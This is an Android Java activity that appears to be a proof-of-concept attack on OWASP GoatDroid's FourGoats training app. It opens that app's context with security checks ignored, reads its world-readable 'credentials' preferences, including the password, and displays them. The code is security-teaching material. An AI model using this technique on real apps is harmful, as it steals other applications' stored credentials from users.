package com.dolphin.sharedpreferences;

import java.util.Map;

import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager.NameNotFoundException;
import android.view.Menu;
import android.widget.EditText;
import android.widget.TextView;

public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Context fourgoatsAppContext = null;
        try {
             fourgoatsAppContext = createPackageContext("org.owasp.goatdroid.fourgoats", Context.CONTEXT_IGNORE_SECURITY);
        } catch (NameNotFoundException e) {
        }
        SharedPreferences sPrefs = fourgoatsAppContext.getSharedPreferences("credentials", Context.MODE_WORLD_READABLE);         
        String passwd = sPrefs.getString("password", "");
        Map<String, ?> prefs = (Map<String, String>) sPrefs.getAll();
        
        String credentials = "OWASP FourGoats Credentials:\r\n";
        for (Map.Entry<String, ?> entry : prefs.entrySet()) {
        	credentials = credentials + "Key : " + entry.getKey() 
       			+ " Value : " + entry.getValue().toString() + "\r\n";
        }
        
        TextView text = new TextView(this);
        text.setText(credentials);
        setContentView(text);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
}
